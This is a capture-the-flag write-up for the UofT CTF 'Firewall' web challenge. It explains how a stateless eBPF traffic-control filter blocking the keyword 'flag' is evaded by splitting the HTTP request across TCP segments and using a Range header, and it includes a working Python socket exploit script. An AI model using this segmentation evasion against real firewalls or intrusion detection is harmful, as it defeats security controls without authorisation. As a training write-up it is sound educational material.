# Firewall - UofT CTF Writeup

**Category:** [[Web]]   
**Flag:** `uoftctf{f1rew4l1_Is_nOT_par7icu11rLy_R0bust_I_bl4m3_3bpf}`

## I. Challenge Overview

The challenge tells us unambiguously: 
> There's a free flag at `/flag.html`

Seems simple enough, so naturally, I run:

```bash
curl http://35.227.38.232:5000/flag.html
```

But instead of getting the flag, the request just times out or fails silently.


## II. Analysis

Surely, something must be blocking my request. So I poke around a bit.

Some observations:

1. The entry point to the challenge is the file `entrypoint.sh`

```dockerfile
ENTRYPOINT ["/src/entrypoint.sh"]
```

2. The `entrypoint.sh` script reveals that before the `Nginx` server starts, it compiles and runs and **eBPF program** (`firewall.c`) to the network using `tc` (traffic control). This program acts as a kernel-level firewall, inspecting every packet entering (`ingress`) and leaving (`egress`) the container.

```sh
tc filter add dev eth0 ingress bpf da \
obj /src/firewall.o sec tc/ingress

tc filter add dev eth0 egress bpf da \
obj /src/firewall.o sec tc/ingress
```

3. Looking at `firewall.c`, the firewall is designed to drop any incoming or outgoing packet that contains the keyword "flag" or the character '%'.

```c
static const char blocked_kw[KW_LEN] = "flag";
static const char blocked_char = '%';
```


This means I have two problems:
### Problem 1: Request Blocked

My request includes the path `/flag.html`, which contains the keyword "flag". This means that the request is bound to get dropped.

### Problem 2: Response Blocked

Supposing the request does go through, the response file `flag.html` contains the keyword "flag" as well:

```html
<title>Flag!</title>
...
<h1>Here is your free flag: ...</h1>
```

So the response is also dropped


## III. Identifying the Vulnerability

The key vulnerability lies in how the firewall processes traffic: it operates on individual packets, not on the TCP stream as a whole. It is stateless, meaning it views each packet as a completely separate event.

The program uses `SEC("tc/ingress")`. In the Linux networking stack, the **Traffic Control (tc)** layer handles raw **Socket Buffers (`sk_buff`)**. This means the firewall sees the bits exactly as they arrive, long before the operating system has a chance to reassemble them into a full TCP stream.

In simpler terms, the program looks at packet A, then packet B, then packet C etc., and it has no memory of what was in packet A when it looks at packet B. As a result, a forbidden keyword like "flag" can be successfully "smuggled" by splitting it across two packets.


## IV. The Strategy

Standard tools like `curl` are designed to be efficient so they automatically bundle the whole HTTP request into one single packet, so this isn't what we're using.

1. **Bypassing the `ingress` filter (request):**

We want to send `GET /flag.html` without the firewall noticing, so we split it into two packets:
- Packet 1: `GET /fl`
- Packet 2: `ag.html HTTP/1.1...`

The server will receive these fragments and reassemble them at the OS level into the original request string, and process it normally. The firewall, sitting at the TC (Traffic Control) layer, only sees the individual segments.

```
┌─────────────────────────────────────────────────────────────┐
│  Application Layer (Nginx)                                  │
│  - Sees: "GET /flag.html HTTP/1.1"                          │
│  - Processes complete HTTP request                          │
└─────────────────────────────────────────────────────────────┘
                            ▲
                            │ Stream Reassembly
                            │
┌─────────────────────────────────────────────────────────────┐
│  TCP Layer (Kernel)                                         │
│  - Combines packet fragments                                │
│  - Handles sequencing & ordering                            │
└─────────────────────────────────────────────────────────────┘
                            ▲
                            │ Individual Packets
                            │
┌─────────────────────────────────────────────────────────────┐
│  TC/eBPF Layer (firewall.c)                                 │
│  - Packet 1: "GET /fl"         → No "flag" found            │
│  - Packet 2: "ag.html HTTP..." → No "flag" found            │
│  -> Stateless inspection - no memory between packets        │
└─────────────────────────────────────────────────────────────┘
```

2. **Bypassing the `egress` filter (response):**

The response is trickier, because we don't control how the server sends back data. If the server happens to find the file `flag.html`, it will see the keyword "flag" inside of it and drop the outgoing packet.

To solve this, we use **HTTP range header**. This header allows us to request specific byte ranges of a file. Using this, we can either only request ranges that don't start or end with the full word "flag" or we can simply start the response after the initial "flag" keywords in the HTML tags. This way we can sneak data past the `egress` filter.

For example, the file contains: `<h1>Here is your free flag: ...</h1>`. If we request `Range: bytes=135-`, we might get only the value inside the brackets so the flag we're looking for, and entirely avoid the word "flag" in the response body.


## V. The Exploit

We use a Python script with low-level socket operations. A critical step is setting `TCP_NODELAY`. By default, **Nagle's Algorithm** might buffer our small chunks to send them in one large packet to save bandwidth. This would trigger the firewall. `TCP_NODELAY` disables this behavior, forcing the OS to send each chunk immediately as its own packet.

```python
import socket, time

host = "35.227.38.232"
port = 5000

# open a raw tcp socket
s = socket.socket()
# disable nagle's algorithm to prevent packets coalescing
# TCP_NODELAY = 1 turns that off
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
s.connect((host, port))

# send first part of request
s.sendall(b"GET /fl")
time.sleep(0.05)

# then send the rest
# Range chosen to grab only what's after "flag" from the provided flag.html
# one byte messages
req = (
    b"ag.html HTTP/1.1\r\n"     # the rest of the request
    b"Host: x\r\n"
    b"Range: bytes=135-\r\n"
    b"Connection: close\r\n"
    b"\r\n"   # end of headers
)
s.sendall(req)

# capture the results
data = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    data += chunk

print(data.decode(errors="ignore"))
```

## VI. Conclusion

This challenge demonstrates a common pitfall in network security: stateless inspection.

While eBPF provides high-performance packet filtering at the kernel level, it cannot effectively block keywords unless it maintains state (e.g., via BPF maps) across the entire TCP stream. By manipulating how the transport layer segments our data, we can "smuggle" forbidden content right under the nose of a kernel-level firewall.


## References

- [IDS Evasion via TCP Segmentation](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [Using BPF to do Packet Transformation](https://blogs.oracle.com/linux/bpf-using-bpf-to-do-packet-transformation?utm_source=chatgpt.com)
- [socket](https://docs.python.org/3/library/socket.html)
- [HTTP range headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Range_requests)
- [Nagle's Algorithm and TCP_NODELAY](https://en.wikipedia.org/wiki/Nagle%27s_algorithm)


[[UOFTCTF2026]]